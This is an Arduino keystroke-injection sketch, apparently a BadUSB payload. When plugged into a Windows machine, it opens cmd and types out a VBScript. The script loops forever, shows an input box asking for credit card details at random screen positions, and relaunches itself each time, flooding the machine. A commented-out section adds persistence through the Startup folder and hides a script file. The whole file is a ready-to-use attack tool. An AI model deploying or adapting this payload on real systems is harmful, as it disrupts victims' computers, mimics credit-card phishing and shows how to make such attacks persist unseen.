#include <Keyboard.h>
void setup()
{
  Keyboard.begin();
  delay(800);
  Keyboard.press(KEY_LEFT_GUI);
  Keyboard.press(114);
  Keyboard.releaseAll();
  delay(200);
  Keyboard.print("cmd");
  typeKey(KEY_RETURN);
  delay(470);
  Keyboard.print("set copycmd=/y");
  typeKey(KEY_RETURN);
  delay(50);
  Keyboard.print("copy con CreditCard.vbs");
  typeKey(KEY_RETURN);
  delay(50);
  Keyboard.print("dim miny, maxy, randy");
  typeKey(KEY_RETURN);
  delay(20);
  Keyboard.print("dim minx, maxx, randx");
  typeKey(KEY_RETURN);
  delay(20);
  Keyboard.print("minx = 1");
  typeKey(KEY_RETURN);
  delay(20);
  Keyboard.print("maxx = 23000");
  typeKey(KEY_RETURN);
  delay(20);
  Keyboard.print("miny = 1");
  typeKey(KEY_RETURN);
  delay(20);
  Keyboard.print("maxy = 13000");
  typeKey(KEY_RETURN);
  delay(20);
  Keyboard.print("do until true = false");
  typeKey(KEY_RETURN);
  delay(20);
  Keyboard.print("randomize");
  typeKey(KEY_RETURN);
  delay(20);
  Keyboard.print("randx = Int((maxx-minx+1)*Rnd+minx)");
  typeKey(KEY_RETURN);
  delay(20);
  Keyboard.print("randomize");
  typeKey(KEY_RETURN);
  delay(20);
  Keyboard.print("randy = Int((maxy-miny+1)*Rnd+miny)");
  typeKey(KEY_RETURN);
  delay(20);
  Keyboard.print("a = InputBox(");

  
  Keyboard.print(F("\""));
  Keyboard.print("Enter your credit card details here:");
  Keyboard.print(F("\""));
  Keyboard.print(",");
  Keyboard.print(F("\""));
  Keyboard.print("CreditCard");
  Keyboard.print(F("\""));

  Keyboard.print(",,randx,randy)"); 
  typeKey(KEY_RETURN);
  delay(20);
  Keyboard.print("CreateObject(");
  Keyboard.print(F("\""));
  Keyboard.print("WScript.Shell");
  Keyboard.print(F("\""));
  Keyboard.print(").Run ");
  Keyboard.print(F("\""));
  Keyboard.print("CreditCard.vbs");
  Keyboard.print(F("\""));
  typeKey(KEY_RETURN);
  delay(20);
  Keyboard.print("loop");
  typeKey(KEY_RETURN);
  delay(20);
  Keyboard.press(KEY_LEFT_CTRL);
  Keyboard.press(122);
  Keyboard.releaseAll();
  typeKey(KEY_RETURN);
  delay(50);
  /*Keyboard.print("copy ");
  Keyboard.print(F("\""));
  Keyboard.print("%USERPROFILE%");
  Keyboard.print(F("\\"));
  Keyboard.print("System.vbs");
  Keyboard.print(F("\""));
  Keyboard.print(" ");
  Keyboard.print(F("\""));
  Keyboard.print("%USERPROFILE%");
  Keyboard.print(F("\\"));
  Keyboard.print("Start Menu");
  Keyboard.print(F("\\"));
  Keyboard.print("Programs");
  Keyboard.print(F("\\"));
  Keyboard.print("Startup");
  Keyboard.print(F("\""));
  typeKey(KEY_RETURN); 
  delay(50); 
  Keyboard.print("attrib +h System.vbs");
  typeKey(KEY_RETURN); 
  delay(50); */
  Keyboard.print("start CreditCard.vbs && exit");
  typeKey(KEY_RETURN);
}
void typeKey(int key)
{
  Keyboard.press(key);
  delay(30);
  Keyboard.release(key);
}
void loop() {}
